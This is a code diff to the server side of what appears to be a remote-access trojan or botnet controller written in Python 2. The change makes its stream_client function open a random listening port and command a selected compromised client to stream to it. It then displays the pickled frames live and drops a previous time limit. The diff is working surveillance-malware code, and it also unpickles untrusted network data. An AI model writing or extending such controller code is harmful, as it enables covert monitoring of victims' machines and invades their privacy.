@@ -53,6 +53,7 @@ import socket
 import select
 import struct
 import base64
+import random
 import requests
 import tempfile
 import threading
@@ -339,29 +340,32 @@ class Server(threading.Thread):
             if output and len(output):
                 print output
 
-    def stream_client(self, client_id=None):
-        if not client_id:
-            if not self.current_client:
-                return 'No Client selected'
-            client  = self.current_client
-        else:
-            if int(client_id) not in self.clients:
-                return 'Invalid Client ID'
-            client  = self.clients[int(client_id)]
+    def stream_client(self, port=None):
+        if not port:
+            port = random.randint(6000,9999)
+        if not self.current_client:
+            return 'No Client selected'
+        client = self.current_client
+        client.lock.clear()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('0.0.0.0', port))
+        s.listen(1)
+        self.send_client('stream {}'.format(port), client.name)
+        conn, addr  = s.accept()
+        print '\nLive streaming {}...\n( press <space> any time to stop )\n'.format(addr[0])
         header_size = struct.calcsize("L")
-        window_name = client.addr[0]
-        print '\npress <space> any time to stop ...\n'
+        window_name = addr[0]
         cv2.namedWindow(window_name)
         data = ""
         try:
             while True:
                 while len(data) < header_size:
-                    data += client.conn.recv(4096)
+                    data += conn.recv(4096)
                 packed_msg_size = data[:header_size]
                 data = data[header_size:]
                 msg_size = struct.unpack("L", packed_msg_size)[0]
                 while len(data) < msg_size:
-                    data += client.conn.recv(4096)
+                    data += conn.recv(4096)
                 frame_data = data[:msg_size]
                 data = data[msg_size:]
                 frame = pickle.loads(frame_data)
@@ -369,11 +373,12 @@ class Server(threading.Thread):
                 key = cv2.waitKey(20)
                 if key == 32:
                     break
-                elif time.time() > time_limit:
-                    break
         finally:
+            try:
+                conn.close()
+            except: pass
             cv2.destroyAllWindows()
-
+            client.lock.set()
 
 class ConnectionHandler(threading.Thread):
     global server
